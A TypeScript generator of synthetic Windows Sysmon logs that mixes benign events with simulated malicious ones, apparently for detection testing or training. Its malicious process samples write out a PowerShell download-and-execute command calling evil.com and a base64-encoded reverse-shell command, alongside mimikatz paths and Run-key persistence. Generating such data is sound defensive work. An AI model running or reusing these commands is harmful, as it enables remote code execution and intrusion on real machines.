// Sysmon log generator - creates realistic Windows Sysmon event logs

export interface SysmonEvent {
  EventID: number;
  System: {
    Provider: { Name: string; Guid: string };
    EventID: number;
    Version: number;
    Level: number;
    Task: number;
    Opcode: number;
    Keywords: string;
    TimeCreated: { SystemTime: string };
    EventRecordID: number;
    Correlation: null;
    Execution: { ProcessID: number; ThreadID: number };
    Channel: string;
    Computer: string;
    Security: { UserID: string };
  };
  EventData: Record<string, string>;
}

export const SYSMON_EVENT_IDS = {
  PROCESS_CREATE: 1,
  FILE_CREATE_TIME: 2,
  NETWORK_CONNECT: 3,
  SERVICE_STATE_CHANGE: 4,
  PROCESS_TERMINATE: 5,
  DRIVER_LOAD: 6,
  IMAGE_LOAD: 7,
  CREATE_REMOTE_THREAD: 8,
  RAW_ACCESS_READ: 9,
  PROCESS_ACCESS: 10,
  FILE_CREATE: 11,
  REGISTRY_ADD: 12,
  REGISTRY_DELETE: 13,
  REGISTRY_SET_VALUE: 14,
  FILE_CREATE_STREAM_HASH: 15,
  PIPE_CREATED: 17,
  PIPE_CONNECTED: 18,
  WMI_EVENT: 19,
  DNS_QUERY: 22,
  FILE_DELETE: 23,
  CLIPBOARD_CHANGE: 24,
  PROCESS_TAMPERING: 25,
  FILE_DELETE_DETECTED: 26,
};

export function generateSysmonEvent(
  eventId: number,
  isMalicious: boolean = false,
  context?: Record<string, any>
): SysmonEvent {
  const timestamp = new Date().toISOString();
  const hostname = context?.hostname || `WIN-${Math.random().toString(36).substr(2, 8).toUpperCase()}`;
  const username = context?.username || `DOMAIN\\${context?.user || 'user'}`;
  const processId = context?.processId || Math.floor(Math.random() * 50000) + 1000;
  const parentProcessId = context?.parentProcessId || Math.floor(Math.random() * 5000) + 100;

  const baseEvent: SysmonEvent = {
    EventID: eventId,
    System: {
      Provider: { Name: 'Microsoft-Windows-Sysmon', Guid: '{5770385f-c22a-43e0-bf4c-06f5698ffbd9}' },
      EventID: eventId,
      Version: 5,
      Level: 4,
      Task: eventId,
      Opcode: 0,
      Keywords: '0x8000000000000000',
      TimeCreated: { SystemTime: timestamp },
      EventRecordID: Math.floor(Math.random() * 1000000),
      Correlation: null,
      Execution: { ProcessID: 1234, ThreadID: 5678 },
      Channel: 'Microsoft-Windows-Sysmon/Operational',
      Computer: hostname,
      Security: { UserID: 'S-1-5-18' },
    },
    EventData: {},
  };

  switch (eventId) {
    case SYSMON_EVENT_IDS.PROCESS_CREATE:
      return generateProcessCreateEvent(baseEvent, isMalicious, context);
    case SYSMON_EVENT_IDS.NETWORK_CONNECT:
      return generateNetworkConnectEvent(baseEvent, isMalicious, context);
    case SYSMON_EVENT_IDS.IMAGE_LOAD:
      return generateImageLoadEvent(baseEvent, isMalicious, context);
    case SYSMON_EVENT_IDS.REGISTRY_SET_VALUE:
      return generateRegistrySetValueEvent(baseEvent, isMalicious, context);
    case SYSMON_EVENT_IDS.FILE_CREATE:
      return generateFileCreateEvent(baseEvent, isMalicious, context);
    case SYSMON_EVENT_IDS.DNS_QUERY:
      return generateDNSQueryEvent(baseEvent, isMalicious, context);
    default:
      return baseEvent;
  }
}

function generateProcessCreateEvent(
  base: SysmonEvent,
  isMalicious: boolean,
  context?: Record<string, any>
): SysmonEvent {
  const maliciousProcesses = [
    { Image: 'C:\\Users\\Public\\malware.exe', CommandLine: 'malware.exe /silent /install' },
    { Image: 'C:\\Windows\\Temp\\payload.exe', CommandLine: 'payload.exe -c "IEX (New-Object Net.WebClient).DownloadString(\'http://evil.com/payload.ps1\')"' },
    { Image: 'powershell.exe', CommandLine: 'powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAiACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQA9ACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwA=' },
  ];

  const benignProcesses = [
    { Image: 'C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE', CommandLine: 'WINWORD.EXE /n' },
    { Image: 'C:\\Windows\\System32\\svchost.exe', CommandLine: 'svchost.exe -k netsvcs' },
    { Image: 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe', CommandLine: 'chrome.exe' },
  ];

  const process = isMalicious
    ? maliciousProcesses[Math.floor(Math.random() * maliciousProcesses.length)]
    : benignProcesses[Math.floor(Math.random() * benignProcesses.length)];

  return {
    ...base,
    EventData: {
      RuleName: '-',
      UtcTime: new Date().toISOString(),
      ProcessGuid: `{${Math.random().toString(36).substr(2, 8)}-${Math.random().toString(36).substr(2, 4)}-${Math.random().toString(36).substr(2, 4)}-${Math.random().toString(36).substr(2, 4)}-${Math.random().toString(36).substr(2, 12)}}`,
      ProcessId: String(Math.floor(Math.random() * 50000) + 1000),
      Image: process.Image,
      FileVersion: isMalicious ? '-' : '16.0.12345.67890',
      Description: isMalicious ? '-' : 'Microsoft Word',
      Product: isMalicious ? '-' : 'Microsoft Office',
      Company: isMalicious ? '-' : 'Microsoft Corporation',
      OriginalFileName: process.Image.split('\\').pop() || '',
      CommandLine: process.CommandLine,
      CurrentDirectory: isMalicious ? 'C:\\Users\\Public\\' : 'C:\\Users\\user\\Documents\\',
      User: context?.username || 'DOMAIN\\user',
      LogonGuid: `{${Math.random().toString(36).substr(2, 32)}}`,
      LogonId: '0x' + Math.floor(Math.random() * 1000000).toString(16),
      TerminalSessionId: '1',
      IntegrityLevel: isMalicious ? 'High' : 'Medium',
      Hashes: isMalicious ? 'SHA256=FAKE_MALICIOUS_HASH' : 'SHA256=LEGITIMATE_HASH',
      ParentProcessGuid: `{${Math.random().toString(36).substr(2, 32)}}`,
      ParentProcessId: String(Math.floor(Math.random() * 5000) + 100),
      ParentImage: isMalicious ? 'C:\\Users\\Public\\document.doc' : 'C:\\Windows\\explorer.exe',
      ParentCommandLine: isMalicious ? 'document.doc' : 'explorer.exe',
      ParentUser: context?.username || 'DOMAIN\\user',
    },
  };
}

function generateNetworkConnectEvent(
  base: SysmonEvent,
  isMalicious: boolean,
  context?: Record<string, any>
): SysmonEvent {
  const maliciousIPs = ['185.220.101.0', '45.146.164.110', '185.220.100.0'];
  const benignIPs = ['8.8.8.8', '1.1.1.1', '13.107.42.14'];

  const destIP = isMalicious
    ? maliciousIPs[Math.floor(Math.random() * maliciousIPs.length)]
    : benignIPs[Math.floor(Math.random() * benignIPs.length)];

  const destPort = isMalicious
    ? Math.floor(Math.random() * 1000) + 8000 // Suspicious high ports
    : [80, 443, 53][Math.floor(Math.random() * 3)]; // Common ports

  return {
    ...base,
    EventData: {
      RuleName: '-',
      UtcTime: new Date().toISOString(),
      ProcessGuid: `{${Math.random().toString(36).substr(2, 32)}}`,
      ProcessId: String(Math.floor(Math.random() * 50000) + 1000),
      Image: isMalicious ? 'C:\\Windows\\System32\\powershell.exe' : 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      User: context?.username || 'DOMAIN\\user',
      Protocol: 'tcp',
      Initiated: 'true',
      SourceIsIpv6: 'false',
      SourceIp: '10.0.1.100',
      SourceHostname: context?.hostname || 'WORKSTATION-01',
      SourcePort: String(Math.floor(Math.random() * 60000) + 1000),
      SourcePortName: '-',
      DestinationIsIpv6: 'false',
      DestinationIp: destIP,
      DestinationHostname: '-',
      DestinationPort: String(destPort),
      DestinationPortName: destPort === 443 ? 'https' : destPort === 80 ? 'http' : '-',
    },
  };
}

function generateImageLoadEvent(
  base: SysmonEvent,
  isMalicious: boolean,
  context?: Record<string, any>
): SysmonEvent {
  const maliciousImages = [
    'C:\\Windows\\Temp\\mimikatz.exe',
    'C:\\Users\\Public\\procdump.exe',
    'C:\\Windows\\System32\\rundll32.exe',
  ];

  const benignImages = [
    'C:\\Windows\\System32\\kernel32.dll',
    'C:\\Windows\\System32\\ntdll.dll',
    'C:\\Program Files\\Microsoft Office\\Office16\\MSO.DLL',
  ];

  return {
    ...base,
    EventData: {
      RuleName: '-',
      UtcTime: new Date().toISOString(),
      ProcessGuid: `{${Math.random().toString(36).substr(2, 32)}}`,
      ProcessId: String(Math.floor(Math.random() * 50000) + 1000),
      Image: isMalicious
        ? maliciousImages[Math.floor(Math.random() * maliciousImages.length)]
        : benignImages[Math.floor(Math.random() * benignImages.length)],
      ImageLoaded: isMalicious
        ? 'C:\\Windows\\Temp\\suspicious.dll'
        : 'C:\\Windows\\System32\\kernel32.dll',
      FileVersion: '-',
      Description: '-',
      Product: '-',
      Company: isMalicious ? '-' : 'Microsoft Corporation',
      OriginalFileName: '-',
      Hashes: isMalicious ? 'SHA256=FAKE_MALICIOUS_DLL_HASH' : 'SHA256=LEGITIMATE_DLL_HASH',
      Signed: isMalicious ? 'false' : 'true',
      Signature: isMalicious ? '-' : 'Microsoft Windows',
      SignatureStatus: isMalicious ? 'Unavailable' : 'Valid',
    },
  };
}

function generateRegistrySetValueEvent(
  base: SysmonEvent,
  isMalicious: boolean,
  context?: Record<string, any>
): SysmonEvent {
  const maliciousKeys = [
    'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
    'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce',
    'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
  ];

  const benignKeys = [
    'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion',
    'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer',
  ];

  return {
    ...base,
    EventData: {
      RuleName: '-',
      UtcTime: new Date().toISOString(),
      EventType: 'SetValue',
      ProcessGuid: `{${Math.random().toString(36).substr(2, 32)}}`,
      ProcessId: String(Math.floor(Math.random() * 50000) + 1000),
      Image: isMalicious ? 'C:\\Windows\\System32\\reg.exe' : 'C:\\Windows\\System32\\svchost.exe',
      TargetObject: isMalicious
        ? maliciousKeys[Math.floor(Math.random() * maliciousKeys.length)]
        : benignKeys[Math.floor(Math.random() * benignKeys.length)],
      Details: isMalicious ? 'C:\\Users\\Public\\malware.exe' : 'Legitimate value',
      User: context?.username || 'DOMAIN\\user',
    },
  };
}

function generateFileCreateEvent(
  base: SysmonEvent,
  isMalicious: boolean,
  context?: Record<string, any>
): SysmonEvent {
  const maliciousFiles = [
    'C:\\Users\\Public\\payload.exe',
    'C:\\Windows\\Temp\\backdoor.dll',
    'C:\\ProgramData\\malware.bat',
  ];

  const benignFiles = [
    'C:\\Users\\user\\Documents\\document.docx',
    'C:\\Users\\user\\Downloads\\file.pdf',
    'C:\\Windows\\Temp\\temp.tmp',
  ];

  return {
    ...base,
    EventData: {
      RuleName: '-',
      UtcTime: new Date().toISOString(),
      ProcessGuid: `{${Math.random().toString(36).substr(2, 32)}}`,
      ProcessId: String(Math.floor(Math.random() * 50000) + 1000),
      Image: isMalicious ? 'C:\\Windows\\System32\\cmd.exe' : 'C:\\Windows\\explorer.exe',
      TargetFilename: isMalicious
        ? maliciousFiles[Math.floor(Math.random() * maliciousFiles.length)]
        : benignFiles[Math.floor(Math.random() * benignFiles.length)],
      CreationUtcTime: new Date().toISOString(),
      User: context?.username || 'DOMAIN\\user',
      Hashes: isMalicious ? 'SHA256=FAKE_MALICIOUS_FILE_HASH' : 'SHA256=LEGITIMATE_FILE_HASH',
    },
  };
}

function generateDNSQueryEvent(
  base: SysmonEvent,
  isMalicious: boolean,
  context?: Record<string, any>
): SysmonEvent {
  const maliciousDomains = [
    'c2-malicious-domain.com',
    'evil-command-control.net',
    'suspicious-beacon.org',
  ];

  const benignDomains = [
    'microsoft.com',
    'google.com',
    'github.com',
  ];

  return {
    ...base,
    EventData: {
      RuleName: '-',
      UtcTime: new Date().toISOString(),
      ProcessGuid: `{${Math.random().toString(36).substr(2, 32)}}`,
      ProcessId: String(Math.floor(Math.random() * 50000) + 1000),
      Image: isMalicious ? 'C:\\Windows\\System32\\powershell.exe' : 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe',
      QueryName: isMalicious
        ? maliciousDomains[Math.floor(Math.random() * maliciousDomains.length)]
        : benignDomains[Math.floor(Math.random() * benignDomains.length)],
      QueryStatus: '0',
      QueryResults: isMalicious ? '185.220.101.0' : '13.107.42.14',
      User: context?.username || 'DOMAIN\\user',
    },
  };
}

export function generateSysmonLogs(
  count: number,
  maliciousRatio: number = 0.1,
  context?: Record<string, any>
): SysmonEvent[] {
  const events: SysmonEvent[] = [];
  const eventTypes = [
    SYSMON_EVENT_IDS.PROCESS_CREATE,
    SYSMON_EVENT_IDS.NETWORK_CONNECT,
    SYSMON_EVENT_IDS.IMAGE_LOAD,
    SYSMON_EVENT_IDS.REGISTRY_SET_VALUE,
    SYSMON_EVENT_IDS.FILE_CREATE,
    SYSMON_EVENT_IDS.DNS_QUERY,
  ];

  for (let i = 0; i < count; i++) {
    const isMalicious = Math.random() < maliciousRatio;
    const eventType = eventTypes[Math.floor(Math.random() * eventTypes.length)];
    events.push(generateSysmonEvent(eventType, isMalicious, context));
  }

  return events.sort((a, b) =>
    new Date(a.System.TimeCreated.SystemTime).getTime() -
    new Date(b.System.TimeCreated.SystemTime).getTime()
  );
}

